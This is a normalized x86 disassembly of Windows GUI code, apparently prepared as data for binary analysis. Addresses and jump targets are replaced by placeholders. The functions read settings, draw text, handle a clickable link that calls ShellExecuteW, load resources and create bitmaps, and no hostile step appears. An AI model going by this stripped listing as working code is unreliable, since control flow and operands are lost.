jmp r-xdata
push 0x16
mov eax r--data
mov ecx esi
call sub_429170
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov ecx [ esp + 0x830 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x81c ]
xor ecx esp
call sub_43f96b
add esp 0x82c
retn
test ebp ebp
je r-xdata
xor ecx ecx
push 0x7fe
push ecx
lea edx [ esp + 0x36 ]
push edx
mov [ esp + 0x38 ] cx
call sub_443360
mov eax [ esp + 0x20 ]
mov ebx 0x8
add esp 0xc
cmp [ esp + 0x28 ] ebx
jae r-xdata
push eax
push 0x400
lea eax [ esp + 0x34 ]
push eax
push r--data
push ebp
push r--data
call [ GetPrivateProfileStringW@IAT ]
lea eax [ esp + 0x2c ]
lea edx [ eax + 0x2 ]
lea eax [ esp + 0x14 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x30 ]
mov esi edi
call sub_429cc0
cmp [ edi + 0x14 ] 0x0
jne r-xdata
cmp [ esp + 0x28 ] ebx
jb r-xdata
mov esi 0xfffffffe
cmp [ esp + 0x28 ] ebx
jb r-xdata
xor eax eax
mov edx [ esp + 0x14 ]
push edx
call sub_43f960
add esp 0x4
mov ecx [ esp + 0x14 ]
push ecx
call sub_43f960
add esp 0x4
sub_421ee0
push 0xffffffff
push sub_45a708
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ esi ] 0x0
mov [ esp + 0x20 ] 0x7
mov [ esp + 0x1c ] 0x0
mov [ esp + 0xc ] ax
lea ecx [ esp + 0x8 ]
mov [ esp + 0x30 ] eax
call sub_429250
push 0x14
mov eax r--data
lea ecx [ esp + 0xc ]
call sub_429170
mov eax [ esp + 0xc ]
mov ebx 0x8
cmp [ esp + 0x20 ] ebx
jae r-xdata
push eax
call sub_42ed00
add esp 0x4
test eax eax
jne r-xdata
lea eax [ esp + 0xc ]
mov eax [ esp + 0xc ]
cmp [ esp + 0x20 ] ebx
jae r-xdata
cmp [ esp + 0x20 ] ebx
jb r-xdata
push eax
call [ LoadLibraryW@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0xc ]
mov eax esi
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ esp + 0x1c ]
xor ecx esp
call sub_43f96b
add esp 0x2c
retn
mov ecx [ esp + 0xc ]
push ecx
jmp r-xdata
cmp [ esp + 0x20 ] ebx
jb r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ esi ] eax
call sub_43f960
add esp 0x4
mov edx [ esp + 0xc ]
push edx
sub_421ff0
push ebx
push esi
mov esi ecx
or [ esi + 0x4 ] 0x8
xor ebx ebx
push edi
mov edi [ esi + 0x34 ]
mov [ esi + 0x28 ] bl
mov [ esi + 0x29 ] bl
cmp edi ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4230c0
cmp [ edi + 0xc ] ebx
je r-xdata
test [ esi + 0x4 ] 0x2
je r-xdata
mov edi [ esi + 0x34 ]
call sub_4230c0
mov ebx [ edi + 0x10 ]
mov edi [ esi + 0x34 ]
call sub_4230c0
mov ecx [ esi + 0x1c ]
mov edx [ edi + 0xc ]
mov eax [ ecx ]
mov eax [ eax + 0x20 ]
push ebx
push edx
push esi
call eax
sub_422040
push ebx
push ebp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
shr ecx 0x2
not ecx
xor eax eax
push edi
test cl 0x1
jne r-xdata
cmp [ esi + 0x28 ] al
je r-xdata
mov eax 0x3
jmp r-xdata
mov ebp [ esp + 0x14 ]
mov ebx [ esi + 0x34 ]
push eax
push 0x0
push 0x0
push ebp
call sub_423340
mov edi [ esi + 0x2c ]
test edi edi
je r-xdata
xor eax eax
cmp [ esi + 0x29 ] al
setne al
inc eax
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
call sub_4230c0
mov ebx [ edi + 0x10 ]
mov edi [ esi + 0x2c ]
call sub_4230c0
mov eax [ esi + 0x18 ]
sub eax [ esi + 0x10 ]
mov edx [ esi + 0x30 ]
sub eax ebx
mov ebx [ esi + 0x2c ]
push edx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax [ esi + 0x14 ]
sub eax [ edi + 0xc ]
sub eax [ esi + 0xc ]
cdq
sub eax edx
sar eax 0x1
push eax
push ebp
call sub_423340
sub_4220d0
push esi
mov esi ecx
cmp [ esi + 0x29 ] 0x0
je r-xdata
pop esi
retn
mov ecx [ esi + 0x1c ]
mov [ esi + 0x29 ] 0x0
test ecx ecx
je r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push 0x0
push 0x0
push 0x0
push esi
call edx
movzx edx [ esi + 0x8 ]
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov eax [ eax + 0x14 ]
push edx
push 0x0
push esi
call eax
sub_422130
push esi
mov esi ecx
cmp [ esi + 0x29 ] 0x0
jne r-xdata
mov eax 0x1
pop esi
retn 0x4
mov ecx [ esi + 0x1c ]
mov [ esi + 0x29 ] 0x1
test ecx ecx
je r-xdata
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
push esi
call edx
mov eax [ ecx ]
mov edx [ eax + 0x28 ]
push 0x0
push 0x0
push 0x0
push esi
call edx
sub_4221e0
push edi
lea edi [ esi + 0x2c ]
mov [ esi ] r--data
call sub_422960
mov eax [ esi + 0x28 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
pop edi
test edx edx
jg r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_422210
push esi
mov esi ecx
push edi
lea edi [ esi + 0x2c ]
mov [ esi ] r--data
call sub_422960
mov eax [ esi + 0x28 ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
test [ esp + 0xc ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
pop edi
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_422280
sub esp 0x14
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push ebx
mov ebx [ esi + 0xc ]
mov [ esp + 0x8 ] edx
mov edx [ esi + 0x8 ]
push ebp
mov [ esp + 0x8 ] ecx
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] ebx
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0x28 ]
mov ebx [ SelectObject@IAT ]
push eax
push edi
call ebx
push edi
mov ebp eax
call [ GetTextColor@IAT ]
mov ecx [ esp + 0x2c ]
push ecx
push edi
mov [ esp + 0x30 ] eax
call [ SetTextColor@IAT ]
mov edx [ esp + 0x10 ]
cmp edx [ esi + 0x8 ]
jne r-xdata
cmp eax ecx
jl r-xdata
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
push 0x4820
lea ecx [ esp + 0xc ]
push ecx
push edx
push eax
push edi
call [ DrawTextW@IAT ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push ecx
push edx
push eax
push edi
call [ TextOutW@IAT ]
jmp r-xdata
pop ebp
pop ebx
add esp 0x14
retn 0x10
cmp eax edx
jge r-xdata
mov ecx [ esp + 0x28 ]
push ecx
push edi
call [ SetTextColor@IAT ]
push ebp
push edi
call ebx
mov [ esp + 0x10 ] eax
sub_422340
push esi
push edi
test edx edx
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp edx [ ebx + 0x30 ]
jge r-xdata
mov ecx edx
shl ecx 0x5
add ecx [ ebx + 0x2c ]
cmp [ ebx + 0x4c ] edx
jne r-xdata
mov edx [ ecx + 0x1c ]
cmp [ edx - 0xc ] 0x0
mov edx [ ecx + 0x18 ]
je r-xdata
mov esi [ ebx + 0x44 ]
jmp r-xdata
test edx edx
jge r-xdata
test edx edx
jge r-xdata
cmp eax 0xffffffff
jne r-xdata
and edx 0xffffff
mov esi edx
mov esi [ ebx + 0x3c ]
jmp r-xdata
mov esi [ ebx + 0x40 ]
jmp r-xdata
cmp [ ecx + 0x14 ] 0x0
lea edi [ ecx + 0x14 ]
jne r-xdata
mov eax [ ebx + 0x48 ]
mov edx [ ecx ]
push esi
mov esi [ edi ]
mov edi [ esp + 0x10 ]
push esi
lea esi [ ecx + 0x4 ]
mov ecx [ edx - 0xc ]
push ecx
push edx
call sub_422280
pop edi
pop esi
retn 0x4
lea edi [ ebx + 0x38 ]
sub_4223d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x1
push edi
mov ebx ecx
call [ SetBkMode@IAT ]
push edi
call [ GetTextColor@IAT ]
mov [ esp + 0xc ] eax
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push edi
call [ GetClipBox@IAT ]
xor esi esi
cmp [ ebx + 0x30 ] esi
jle r-xdata
lea edx [ eax - 0x1 ]
mov eax [ ebp + 0xc ]
push edi
call sub_422340
mov ecx [ esp + 0xc ]
push ecx
push edi
call [ SetTextColor@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
xor edi edi
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp esi [ ebx + 0x30 ]
jge r-xdata
mov eax [ ebx + 0x2c ]
add eax edi
lea ecx [ esp + 0x10 ]
push ecx
add eax 0x4
push eax
lea edx [ esp + 0x28 ]
push edx
call [ IntersectRect@IAT ]
test eax eax
je r-xdata
inc esi
add edi 0x20
cmp esi [ ebx + 0x30 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov edx esi
call sub_422340
test edi edi
jl r-xdata
mov ecx [ esp + 0xc ]
mov edi [ ebp + 0x8 ]
push ecx
push edi
call [ SetTextColor@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4224a0
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
cmp eax 0xffffffff
je r-xdata
pop esi
pop ecx
retn
mov [ esi + 0x50 ] 0xffffffff
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp eax [ esi + 0x30 ]
jge r-xdata
mov ecx [ esi + 0x1c ]
push edi
test ecx ecx
je r-xdata
mov eax [ esi + 0x4c ]
cmp eax 0xffffffff
je r-xdata
mov edx [ ecx ]
mov edx [ edx + 0x28 ]
lea edi [ eax + 0x1 ]
push edi
mov edi [ esi + 0x2c ]
shl eax 0x5
push 0x0
lea eax [ eax + edi + 0x4 ]
push eax
push esi
call edx
pop edi
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
cmp eax [ esi + 0x30 ]
jge r-xdata
mov ecx [ esi + 0x2c ]
shl eax 0x5
mov edi [ eax + ecx + 0x1c ]
push 0x7
push r--data
push edi
call sub_4417eb
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push 0x0
push 0x0
push edi
push r--data
push 0x0
call [ ShellExecuteW@IAT ]
pop edi
pop esi
pop ecx
retn
add edi 0xe
cmp [ edi ] 0x30
jne r-xdata
push 0xa
lea eax [ esp + 0xc ]
push eax
movzx eax [ edi + 0x2 ]
cmp ax 0x78
je r-xdata
push 0x10
lea edx [ esp + 0xc ]
push edx
add edi 0x4
jmp r-xdata
cmp ax 0x58
jne r-xdata
push edi
call sub_4416d6
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
add esp 0xc
push eax
mov eax [ edx + 0x14 ]
push 0x0
push esi
call eax
sub_4225a0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x30 ] ebx
push edi
jle r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor edi edi
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp ebx [ esi + 0x30 ]
jge r-xdata
mov eax [ esi + 0x2c ]
mov ecx [ eax + edi + 0x1c ]
add eax edi
cmp [ ecx - 0xc ] 0x0
je r-xdata
inc ebx
add edi 0x20
cmp ebx [ esi + 0x30 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
mov ecx [ ecx ]
push edx
push ecx
add eax 0x4
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
test edi edi
jl r-xdata
push 0x7f89
push 0x0
call [ LoadCursorW@IAT ]
push eax
call [ SetCursor@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422630
push esi
mov esi ecx
cmp [ esi + 0x50 ] 0xffffffff
je r-xdata
xor eax eax
cmp [ esi + 0x50 ] 0xffffffff
pop esi
setne al
retn 0x4
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
call edx
sub_422660
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x30 ] ebx
push edi
jle r-xdata
xor eax eax
cmp [ esi + 0x50 ] 0xffffffff
setne al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ esp + 0xc ] eax
jmp r-xdata
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp ebx [ esi + 0x30 ]
jge r-xdata
mov edi [ esi + 0x2c ]
add edi eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
lea eax [ edi + 0x4 ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x1c ]
cmp [ ecx - 0xc ] 0x0
mov eax [ esi + 0x50 ]
mov [ esp + 0xc ] eax
je r-xdata
add [ esp + 0xc ] 0x20
inc ebx
cmp ebx [ esi + 0x30 ]
jl r-xdata
mov [ esi + 0x50 ] 0xffffffff
cmp eax ebx
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi + 0x1c ]
mov [ esi + 0x50 ] ebx
test ecx ecx
je r-xdata
cmp eax [ esi + 0x30 ]
jge r-xdata
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push esi
call eax
mov eax [ esp + 0xc ]
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
inc ebx
push ebx
push 0x0
add edi 0x4
push edi
push esi
call eax
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov edx [ edx + 0x28 ]
lea edi [ eax + 0x1 ]
push edi
mov edi [ esi + 0x2c ]
shl eax 0x5
push 0x0
lea eax [ eax + edi + 0x4 ]
push eax
push esi
call edx
xor eax eax
cmp [ esi + 0x50 ] 0xffffffff
pop edi
pop esi
setne al
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422770
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x30 ] ebx
push edi
jle r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ esp + 0xc ] eax
jmp r-xdata
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp ebx [ esi + 0x30 ]
jge r-xdata
mov edi [ esi + 0x2c ]
add edi eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push ecx
push edx
lea eax [ edi + 0x4 ]
push eax
call [ PtInRect@IAT ]
test eax eax
jne r-xdata
mov ecx [ edi + 0x1c ]
cmp [ ecx - 0xc ] 0x0
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
je r-xdata
add [ esp + 0xc ] 0x20
inc ebx
cmp ebx [ esi + 0x30 ]
jl r-xdata
mov [ esi + 0x4c ] 0xffffffff
cmp eax ebx
je r-xdata
mov eax [ esp + 0xc ]
test eax eax
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi + 0x1c ]
mov [ esi + 0x4c ] ebx
test ecx ecx
je r-xdata
cmp eax [ esi + 0x30 ]
jge r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
inc ebx
push ebx
push 0x0
add edi 0x4
push edi
push esi
call eax
mov eax [ esp + 0xc ]
jmp r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
mov edx [ edx + 0x28 ]
lea edi [ eax + 0x1 ]
push edi
mov edi [ esi + 0x2c ]
shl eax 0x5
push 0x0
lea eax [ eax + edi + 0x4 ]
push eax
push esi
call edx
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4228e0
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_422900
mov eax [ ecx ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_422920
mov eax [ esi + 0x1c ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov eax [ esi ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_422960
push ebx
xor ebx ebx
cmp [ edi ] ebx
je r-xdata
mov [ edi + 0x8 ] ebx
mov [ edi + 0x4 ] ebx
pop ebx
retn
push ebp
xor ebp ebp
cmp [ edi + 0x4 ] ebx
jle r-xdata
mov eax [ edi ]
push eax
call sub_44120e
add esp 0x4
mov [ edi ] ebx
pop ebp
push esi
mov esi [ esi ]
sub esi 0x10
lea ecx [ esi + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
inc ebp
add ebx 0x20
cmp ebp [ edi + 0x4 ]
jl r-xdata
mov ecx [ esi ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push esi
call edx
mov esi [ edi ]
mov eax [ esi + ebx + 0x1c ]
add esi ebx
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
xor ebx ebx
pop esi
sub_422a00
sub esp 0x20
push ebx
xor eax eax
cmp [ edi + 0x30 ] eax
push ebp
push esi
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
jle r-xdata
xor ebx ebx
xor edx edx
cmp [ edi + 0x30 ] ebx
jle r-xdata
mov [ esp + 0x18 ] eax
jmp r-xdata
test [ edi + 0x4 ] 0x2
je r-xdata
xor ebp ebp
test eax eax
jl r-xdata
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov eax [ edi + 0x48 ]
cmp eax 0xffffffff
je r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp ebx [ edi + 0x30 ]
jge r-xdata
mov ecx [ esp + 0x14 ]
cmp ecx [ edi + 0x30 ]
jge r-xdata
mov esi [ esp + 0x10 ]
mov ecx [ edi + 0x1c ]
mov eax [ ecx ]
push esi
push edx
mov edx [ eax + 0x20 ]
push edi
call edx
cmp edx eax
jle r-xdata
mov ecx [ edi + 0x2c ]
mov esi [ ecx + ebp + 0x10 ]
add [ ecx + ebp + 0xc ] edx
lea eax [ ecx + ebp + 0x4 ]
mov ecx [ esp + 0x10 ]
sub ecx esi
mov [ eax + 0x4 ] ecx
add ecx esi
mov [ eax ] edx
mov edx [ eax + 0x8 ]
inc ebx
mov [ eax + 0xc ] ecx
add ebp 0x20
cmp ebx [ edi + 0x30 ]
jl r-xdata
mov esi [ edi + 0x2c ]
add esi eax
cmp [ esi + 0x14 ] 0x0
lea eax [ esi + 0x14 ]
jne r-xdata
mov edx eax
test ebp ebp
jl r-xdata
mov eax [ eax ]
mov edx [ rw-data ]
mov ebx [ esi ]
mov ebp [ ebx - 0xc ]
push eax
push edx
call [ SelectObject@IAT ]
mov [ esp + 0x1c ] eax
mov eax ebp
cmp ebp 0xffffffff
jne r-xdata
lea eax [ edi + 0x38 ]
mov edx [ rw-data ]
lea ecx [ esp + 0x20 ]
push ecx
push eax
push ebx
push edx
call [ GetTextExtentPoint32W@IAT ]
mov eax [ esp + 0x1c ]
mov ecx [ rw-data ]
push eax
push ecx
call [ SelectObject@IAT ]
mov edx [ esp + 0x20 ]
mov [ esi + 0xc ] edx
mov eax [ esp + 0x24 ]
mov [ esi + 0x10 ] eax
mov eax [ esp + 0x24 ]
cmp [ esp + 0x10 ] eax
jg r-xdata
push ebx
call [ lstrlenW@IAT ]
mov eax [ esp + 0x14 ]
add [ esp + 0x18 ] 0x20
inc eax
cmp eax [ edi + 0x30 ]
mov [ esp + 0x14 ] eax
jl r-xdata
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x18 ]
sub_422b50
push 0xffffffff
push sub_459e6b
mov eax [ fs : 0x0 ]
push eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ esp + 0x1c ]
xor esi esi
xor eax eax
mov [ edi + 0x4 ] esi
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] eax
mov [ edi + 0x18 ] eax
mov [ edi + 0x1c ] esi
mov [ edi + 0x20 ] esi
mov [ edi + 0x24 ] esi
mov [ edi ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov ecx rw-data
call edx
add eax 0x10
mov [ edi + 0x28 ] eax
mov [ esp + 0x14 ] esi
mov [ edi + 0x2c ] esi
mov [ edi + 0x30 ] esi
mov [ edi + 0x34 ] esi
mov [ edi + 0x38 ] esi
mov [ esp + 0x14 ] 0x2
or eax 0xffffffff
mov [ edi + 0x48 ] eax
mov [ edi + 0x4c ] eax
mov [ edi + 0x50 ] eax
mov eax [ rw-data ]
mov [ edi + 0x40 ] 0x984e00
mov [ edi + 0x44 ] 0xda7003
mov ecx [ eax + 0x8 ]
mov [ edi + 0x38 ] ecx
call sub_422a00
cmp [ edi + 0x3c ] esi
je r-xdata
mov eax edi
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0xc
retn 0x4
mov ecx [ edi + 0x1c ]
mov [ edi + 0x3c ] esi
cmp ecx esi
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x28 ]
push esi
push esi
push esi
push edi
call eax
sub_422c30
push esi
mov esi ecx
push edi
mov edi [ esi + 0x28 ]
test edi edi
je r-xdata
pop edi
pop esi
retn
test [ esi + 0x4 ] 0x2
je r-xdata
mov edi [ esi + 0x28 ]
call sub_4230c0
cmp [ edi + 0x16 ] 0x0
je r-xdata
push ebx
call sub_4230c0
mov ebx [ edi + 0x10 ]
mov edi [ esi + 0x28 ]
call sub_4230c0
mov ecx [ esi + 0x1c ]
mov edx [ edi + 0xc ]
mov eax [ ecx ]
mov eax [ eax + 0x20 ]
push ebx
push edx
push esi
call eax
pop ebx
and [ esi + 0x4 ] 0xfffffff7
or [ esi + 0x4 ] 0x8
pop edi
pop esi
retn
sub_422ca0
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov edx [ rw-data ]
push eax
push ecx
push edx
call [ FindResourceW@IAT ]
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
xor al al
retn 0x8
push eax
mov eax [ rw-data ]
push eax
call [ LoadResource@IAT ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov al 0x1
retn 0x8
mov [ esi + 0x4 ] eax
sub_422ce0
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax + 0x54 ]
xor esi esi
jmp r-xdata
mov ebx [ esp + 0x18 ]
mov edi [ esi ]
mov eax [ esp + 0x14 ]
push ebx
push edi
push eax
call sub_443790
add edi ebx
add esp 0xc
mov [ esi ] edi
pop edi
pop esi
pop ebx
retn
sub_422d10
push ebp
mov ebp esp
sub esp 0x50
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push 0x8
xor edi edi
push eax
xor edx edx
mov [ ebp - 0xc ] edi
call sub_436bd0
add esp 0x8
test eax eax
je r-xdata
call sub_4305e0
mov ebx eax
mov [ ebp - 0x20 ] ebx
cmp ebx edi
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x244 ]
mov edx [ ebx + 0x248 ]
push ecx
push edx
mov ecx 0x2
call sub_43b540
mov esi eax
add esp 0x8
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] esi
cmp esi edi
je r-xdata
push 0x120
push edi
push esi
call sub_443360
add esp 0xc
push edi
push ebx
call sub_456adc
mov ebx [ ebp - 0x20 ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x24 ] eax
cmp ebx edi
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax edi
je r-xdata
mov edi [ ebp - 0x4 ]
push edi
mov ecx ebx
call sub_430900
add esp 0x4
cmp [ edi + 0x18 ] 0x10
jne r-xdata
mov edx sub_422ce0
lea ecx [ ebp - 0x24 ]
mov [ ebx + 0x54 ] ecx
test edx edx
je r-xdata
mov edi [ ebp - 0x4 ]
push eax
call [ DeleteObject@IAT ]
mov [ ebp - 0xc ] edi
cmp [ edi + 0x19 ] 0x3
mov ecx 0x2001000
mov edx 0xffffffbf
jne r-xdata
test ebx ebx
je r-xdata
mov [ ebx + 0x50 ] sub_437550
mov [ ebx + 0x50 ] sub_422ce0
jmp r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test edi edi
je r-xdata
cmp [ edi + 0x18 ] 0x8
jae r-xdata
test ebx ebx
je r-xdata
or [ ebx + 0x70 ] 0x400
mov [ ebx + 0x14c ] edi
mov ecx r--data
mov esi ebx
mov [ ebx + 0x4c ] edi
call sub_43b800
mov ecx r--data
call sub_43b800
cmp [ ebx + 0x4c ] edi
je r-xdata
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x20 ]
push edx
call sub_431880
mov eax [ ebp - 0xc ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
or [ ebx + 0x70 ] ecx
and [ ebx + 0x6c ] edx
mov esi [ ebx + 0x24c ]
mov edi [ ebx + 0x244 ]
push 0x0
xor eax eax
call sub_431900
add esp 0x4
push ebx
mov edx edi
mov ecx esi
call sub_43b5e0
add esp 0x4
mov al [ edi + 0x19 ]
test al al
je r-xdata
mov eax [ edi + 0x8 ]
and eax 0x10
je r-xdata
or [ ebx + 0x70 ] ecx
and [ ebx + 0x6c ] edx
or [ ebx + 0x70 ] 0x4000
and [ ebx + 0x6c ] edx
cmp al 0x4
jne r-xdata
or [ ebx + 0x70 ] ecx
and [ ebx + 0x6c ] edx
xor eax eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x50 ] 0x28
mov eax [ edi ]
mov [ ebp - 0x4c ] eax
mov ecx [ edi + 0x4 ]
xor esi esi
push esi
neg ecx
mov edx 0x1
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] dx
movzx ax [ edi + 0x1d ]
push esi
lea ecx [ ebp - 0x8 ]
push ecx
add ax ax
push esi
lea edx [ ebp - 0x50 ]
add ax ax
push edx
add ax ax
push esi
mov [ ebp - 0x42 ] ax
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x8 ] esi
call [ CreateDIBSection@IAT ]
mov [ ebp - 0xc ] eax
cmp eax esi
je r-xdata
test [ ebx + 0x6c ] 0x40
mov esi ebx
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
